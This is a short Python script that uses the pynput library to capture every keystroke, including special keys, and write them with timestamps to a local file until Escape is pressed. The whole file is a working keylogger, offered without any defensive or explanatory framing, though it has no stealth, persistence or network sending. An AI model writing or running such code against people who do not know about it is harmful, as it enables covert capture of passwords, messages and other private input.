import logging
from pynput import keyboard
from datetime import datetime

# Set up logging
log_file = "key_log.txt"
logging.basicConfig(filename=log_file, level=logging.DEBUG, format='%(asctime)s: %(message)s')

# Function to log key presses
def on_press(key):
    try:
        # Log the character key press
        logging.info(f'Key pressed: {key.char}')
    except AttributeError:
        # Handle special keys
        if key == keyboard.Key.space:
            logging.info('Key pressed: [SPACE]')
        elif key == keyboard.Key.enter:
            logging.info('Key pressed: [ENTER]')
        elif key == keyboard.Key.backspace:
            logging.info('Key pressed: [BACKSPACE]')
        elif key == keyboard.Key.tab:
            logging.info('Key pressed: [TAB]')
        elif key == keyboard.Key.esc:
            logging.info('Key pressed: [ESCAPE]')
            # Stop listener
            return False
        else:
            logging.info(f'Key pressed: [{key}]')

# Function to log key releases (optional)
def on_release(key):
    # You can log key releases if needed
    # logging.info(f'Key released: {key}')
    pass

# Start the listener
with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()

